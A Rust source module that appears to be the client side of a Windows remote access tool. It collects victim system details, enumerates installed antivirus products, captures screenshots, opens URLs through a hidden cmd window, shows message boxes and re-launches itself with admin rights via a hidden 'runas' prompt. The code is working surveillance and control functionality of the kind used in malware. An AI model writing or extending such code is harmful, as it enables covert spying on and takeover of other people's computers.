use sysinfo::{ System, Disks };
use screenshots::{ image, Screen };

use std::io::Cursor;
use std::ptr;
use std::ptr::null_mut as NULL;
use std::ffi::OsStr;
use std::os::windows::{process::CommandExt, ffi::OsStrExt};

use winapi::um::{shellapi::ShellExecuteW, winuser};
use winapi::um::winuser::{ SW_HIDE, EnumDisplayMonitors };
use winapi::shared::winerror::{ S_OK, DXGI_ERROR_NOT_FOUND };
use winapi::shared::dxgi::{ CreateDXGIFactory, IDXGIFactory, IDXGIAdapter };
use winapi::shared::minwindef::UINT;
use winapi::shared::windef::{ HMONITOR, HDC, RECT };
use winapi::shared::minwindef::{ BOOL, LPARAM };
use winapi::Interface;

use crate::service::install::is_elevated;
use crate::features::av_detection::get_installed_avs;
use common::packets::{MessageBoxData, VisitWebsiteData, ClientInfo};

pub fn client_info(group: String) -> ClientInfo{
    let mut s = System::new_all();

    let mut storage = Vec::new();

    let disks = Disks::new_with_refreshed_list();
    for disk in disks.list() {
        storage.push(
            format!(
                "{} {} {}",
                disk.name().to_string_lossy(),
                convert_bytes(disk.available_space() as f64),
                disk.kind()
            )
        );
    }

    let mut gpus = Vec::new();

    unsafe {
        let mut factory: *mut IDXGIFactory = std::ptr::null_mut();
        let hr = CreateDXGIFactory(&IDXGIFactory::uuidof(), &mut factory as *mut _ as *mut _);

        if hr != S_OK {
            eprintln!("Failed to create DXGI Factory");
        }

        let mut i = 0;
        loop {
            let mut adapter: *mut IDXGIAdapter = std::ptr::null_mut();
            if (*factory).EnumAdapters(i, &mut adapter) == DXGI_ERROR_NOT_FOUND {
                break;
            }

            let mut desc = std::mem::zeroed();
            (*adapter).GetDesc(&mut desc);

            let adapter_description = String::from_utf16_lossy(&desc.Description);

            gpus.push(adapter_description.trim_end_matches(char::from(0)).to_string());

            i += 1;
        }
    }

    let mut display_count = 0;

    unsafe {
        EnumDisplayMonitors(
            ptr::null_mut(),
            ptr::null_mut(),
            Some(monitor_enum_proc),
            &mut display_count as *mut _ as LPARAM
        );
    }

    std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
    s.refresh_cpu_all();

    let installed_avs = get_installed_avs();
    
    // No blocking calls in this function - we'll fetch location asynchronously later if needed

    let client_data = ClientInfo {
        uuidv4: None,
        addr: None,
        group,
        username: std::env::var("username").unwrap_or_else(|_| "__UNKNOWN__".to_string()),
        hostname: System::host_name().unwrap().to_string(),
        os: format!("{} {}", System::name().unwrap(), System::os_version().unwrap()),
        ram: convert_bytes(s.total_memory() as f64),
        cpu: s.cpus()[0].brand().to_string().clone(),
        gpus: gpus.clone(),
        storage: storage.clone(),
        displays: display_count,
        is_elevated: is_elevated(),
        reverse_proxy_port: "".to_string(),
        installed_avs,
        disconnected: None,
        country_code: "N/A".to_string(),
    };

    client_data
}

pub fn take_screenshot(display: i32) -> Vec<u8> {
    let screens = Screen::all().unwrap();

    let screen = screens[display as usize];

    let image = screen.capture().unwrap();

    let mut bytes: Vec<u8> = Vec::new();

    image
        .write_to(&mut Cursor::new(&mut bytes), image::ImageOutputFormat::Jpeg(35))
        .expect("Couldn't write image to bytes.");

    bytes
}

pub fn visit_website(
    visit_data: &VisitWebsiteData
) {
    let visit_type = visit_data.visit_type.as_str();
    let url = visit_data.url.as_str();

    const DETACH: u32 = 0x00000008;
    const HIDE: u32 = 0x08000000;

    if visit_type == "normal" {
        //println!("Opening URL: {}", url);
        std::process::Command
            ::new("cmd")
            .args(["/C", "start", url])
            .creation_flags(HIDE | DETACH)
            .spawn()
            .unwrap();
    }
}

pub fn show_messagebox(data: MessageBoxData) {
    let l_msg: Vec<u16> = format!("{}\0", data.message).encode_utf16().collect();
    let l_title: Vec<u16> = format!("{}\0", data.title).encode_utf16().collect();

    let button = data.button.as_str();
    let icon = data.icon.as_str();

    unsafe {
        winuser::MessageBoxW(
            NULL(),
            l_msg.as_ptr(),
            l_title.as_ptr(),
            (match button {
                "ok" => winuser::MB_OK,
                "ok_cancel" => winuser::MB_OKCANCEL,
                "abort_retry_ignore" => winuser::MB_ABORTRETRYIGNORE,
                "yes_no_cancel" => winuser::MB_YESNOCANCEL,
                "yes_no" => winuser::MB_YESNO,
                "retry_cancel" => winuser::MB_RETRYCANCEL,
                _ => winuser::MB_OK,
            }) |
                (match icon {
                    "info" => winuser::MB_ICONINFORMATION,
                    "warning" => winuser::MB_ICONWARNING,
                    "error" => winuser::MB_ICONERROR,
                    "question" => winuser::MB_ICONQUESTION,
                    "asterisk" => winuser::MB_ICONASTERISK,
                    _ => winuser::MB_ICONINFORMATION,
                })
        );
    }
}

pub fn elevate_client() {
    if is_elevated() {
        return;
    }

    crate::MUTEX_SERVICE.lock().unwrap().unlock();

    let exe = std::env::current_exe().unwrap();
    let path = exe.to_str().unwrap();

    let operation = OsStr::new("runas");
    let path_os = OsStr::new(path);
    let operation_encoded: Vec<u16> = operation.encode_wide().chain(Some(0)).collect();
    let path_encoded: Vec<u16> = path_os.encode_wide().chain(Some(0)).collect();

    unsafe {
        let h_instance = ShellExecuteW(
            ptr::null_mut(),
            operation_encoded.as_ptr(),
            path_encoded.as_ptr(),
            ptr::null(),
            ptr::null(),
            SW_HIDE
        );

        if (h_instance as UINT) > 32 {
            std::process::exit(1);
        } else {
            crate::MUTEX_SERVICE.lock().unwrap().lock();
        }
    }
}

const SUFFIX: [&str; 9] = ["B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"];

pub fn convert_bytes<T: Into<f64>>(size: T) -> String {
    let size = size.into();

    if size <= 0.0 {
        return "0 B".to_string();
    }

    let base = size.log10() / (1024_f64).log10();

    let mut result = (((1024_f64).powf(base - base.floor()) * 10.0).round() / 10.0).to_string();

    result.push(' ');
    result.push_str(SUFFIX[base.floor() as usize]);

    result
}

unsafe extern "system" fn monitor_enum_proc(
    _h_monitor: HMONITOR,
    _hdc_monitor: HDC,
    _lprc_monitor: *mut RECT,
    lparam: LPARAM
) -> BOOL {
    let count = &mut *(lparam as *mut usize);
    *count += 1;
    1
}
